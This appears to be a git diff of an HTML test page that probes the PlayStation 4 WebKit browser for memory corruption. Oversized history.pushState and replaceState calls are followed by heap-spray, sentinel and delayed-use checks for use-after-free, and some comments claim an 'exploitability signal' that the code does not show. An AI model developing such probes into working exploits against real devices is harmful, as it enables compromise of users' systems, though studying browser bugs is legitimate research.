@@ -2,128 +2,153 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit – Option A / Option B</title>
-
+<title>PS4 WebKit History.pushState – Step 7 Validation</title>
+<style>
+body {
+    background: #000;
+    color: #0f0;
+    font-family: monospace;
+}
+button {
+    font-size: 16px;
+    margin: 5px;
+}
+#log {
+    white-space: pre-wrap;
+    margin-top: 10px;
+}
+</style>
 </head>
-
 <body>
-<h2>PS4 WebKit – Post-Crash Boundary Analysis</h2>
 
-<button onclick="runOptionA()">OPTION A – UAF / Inconsistent State (NO CRASH)</button>
-<button onclick="runOptionB()">OPTION B – Exploitability Signal (49 + Partial)</button>
+<h2>PS4 WebKit – Step 7: Structural Corruption Validation</h2>
+
+<button onclick="testOptionA()">Option A – Sentinel Corruption</button>
+<button onclick="testOptionB()">Option B – Delayed Use (UAF)</button>
+<button onclick="testOptionC()">Option C – Cross-Object Impact</button>
 
 <div id="log"></div>
 
 <script>
-const logEl = document.getElementById("log");
-function log(m){ logEl.textContent += m + "\n"; }
-function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
-
-const BASE = 977;
-const STEP = 14461;
-const SAFE_ITERS = 49;
-
-// -------------------------------------------------
-// CORE SEQUENCE (shared)
-// -------------------------------------------------
-async function historySequence(iterations, allowPartial){
-    let size = BASE;
-
-    for(let i=0;i<iterations;i++){
-        const payload = "A".repeat(size);
-        log(`[ITER ${i}] size=${size}`);
-
-        history.pushState({}, "", "#"+payload);
-        history.replaceState({}, "", "#"+payload.slice(0, payload.length >> 1));
-
-        if(i % 6 === 0){
-            setTimeout(()=>history.back(),0);
-            log("  history.back (async)");
-        }
-
-        size += STEP;
-        await sleep(5);
-    }
-
-    // Partial iteration (only pushState)
-    if(allowPartial){
-        log("[PARTIAL] Executing controlled extra pushState");
-        const payload = "B".repeat(size);
-        history.pushState({}, "", "#"+payload);
-        log("[PARTIAL] pushState completed");
-    }
+function log(msg) {
+    document.getElementById("log").textContent += msg + "\n";
 }
 
-// -------------------------------------------------
-// OPTION A – Prove UAF / Inconsistent State
-// -------------------------------------------------
-async function runOptionA(){
-    logEl.textContent = "";
-    log("=== OPTION A START ===");
-    log("Goal: Reach post-history usage WITHOUT crash");
+/* ===============================
+   COMMON PAYLOAD GENERATOR
+   =============================== */
+function makePayload(size) {
+    return {
+        data: "A".repeat(size),
+        nested: { x: 1 }
+    };
+}
+
+/* ===============================
+   OPTION A – SENTINEL CORRUPTION
+   =============================== */
+function testOptionA() {
+    log("\n[Option A] Sentinel Heap Corruption Test");
+
+    let sentinel = new Uint32Array(16);
+    for (let i = 0; i < sentinel.length; i++) {
+        sentinel[i] = 0x41414141;
+    }
+
+    log("Sentinel allocated");
 
     try {
-        await historySequence(SAFE_ITERS, false);
-        log("[A] History sequence completed");
+        let payload = makePayload(695105);
+        history.pushState(payload, "", "#A" + payload.data);
+        history.replaceState(payload, "", "#B" + payload.data);
+    } catch (e) {
+        log("Exception during push/replace: " + e);
+    }
 
-        await sleep(120);
-
-        log("[A] Heap reuse / observation phase");
-        let arr = [];
-        for(let i=0;i<40;i++){
-            arr.push("OBJ_"+i+"_"+"X".repeat(256));
+    let corrupted = false;
+    for (let i = 0; i < sentinel.length; i++) {
+        if (sentinel[i] !== 0x41414141) {
+            corrupted = true;
+            log("CORRUPTION DETECTED at index " + i +
+                " value=0x" + sentinel[i].toString(16));
         }
+    }
 
-        log("[A] Using data after history stress");
-        for(let i=0;i<arr.length;i++){
-            let s = arr[i] + arr[(i+1)%arr.length];
-            if(i % 8 === 0) log("  use len="+s.length);
-        }
-
-        log("=== OPTION A FINISHED – NO CRASH ===");
-        log(">>> Indicates latent corruption / UAF window <<<");
-
-    } catch(e){
-        log("[A] JS Exception: " + e);
+    if (!corrupted) {
+        log("No sentinel corruption observed");
     }
 }
 
-// -------------------------------------------------
-// OPTION B – Exploitability Signal
-// -------------------------------------------------
-async function runOptionB(){
-    logEl.textContent = "";
-    log("=== OPTION B START ===");
-    log("Goal: 49 iterations + controlled partial reuse");
+/* ===============================
+   OPTION B – DELAYED USE (UAF)
+   =============================== */
+function testOptionB() {
+    log("\n[Option B] Delayed Use / UAF Test");
+
+    let payload = makePayload(695105);
 
     try {
-        await historySequence(SAFE_ITERS, true);
-        log("[B] History + partial iteration completed");
-
-        await sleep(80);
-
-        log("[B] Minimal heap interaction after boundary");
-        let tmp = [];
-        for(let i=0;i<20;i++){
-            tmp.push("Z".repeat(512));
-        }
-
-        log("[B] Post-boundary usage");
-        for(let i=0;i<tmp.length;i++){
-            let s = tmp[i] + tmp[(i+3)%tmp.length];
-            if(i % 5 === 0) log("  use len="+s.length);
-        }
-
-        log("=== OPTION B FINISHED ===");
-        log(">>> If behavior differs or crash moves, exploitability confirmed <<<");
-
-    } catch(e){
-        log("[B] JS Exception: " + e);
+        history.pushState(payload, "", "#UAF" + payload.data);
+        history.replaceState(payload, "", "#UAF2" + payload.data);
+    } catch (e) {
+        log("Exception during push/replace: " + e);
     }
+
+    log("State stored, waiting before reuse...");
+
+    setTimeout(function () {
+        try {
+            log("Re-accessing payload after delay");
+            payload.nested.x += 1;
+            log("Payload still accessible, x=" + payload.nested.x);
+        } catch (e) {
+            log("UAF-like failure detected: " + e);
+        }
+    }, 800);
 }
 
-log("Ready. Choose OPTION A or OPTION B.");
+/* ===============================
+   OPTION C – CROSS-OBJECT IMPACT
+   =============================== */
+function testOptionC() {
+    log("\n[Option C] Cross-Object Heap Impact Test");
+
+    try {
+        let payload = makePayload(695105);
+        history.pushState(payload, "", "#C" + payload.data);
+        history.replaceState(payload, "", "#C2" + payload.data);
+    } catch (e) {
+        log("Exception during push/replace: " + e);
+    }
+
+    log("Triggering external allocations");
+
+    let victims = [];
+    for (let i = 0; i < 100; i++) {
+        victims.push(new Uint32Array(256));
+    }
+
+    try {
+        for (let i = 0; i < victims.length; i++) {
+            victims[i][0] = 0x13371337;
+        }
+        log("Victim objects accessed successfully");
+    } catch (e) {
+        log("Cross-object corruption detected: " + e);
+    }
+
+    victims = null;
+
+    try {
+        for (let i = 0; i < 10; i++) {
+            new ArrayBuffer(1024 * 1024);
+        }
+        log("GC pressure applied");
+    } catch (e) {
+        log("Crash during GC pressure: " + e);
+    }
+}
 </script>
+
 </body>
 </html>
-
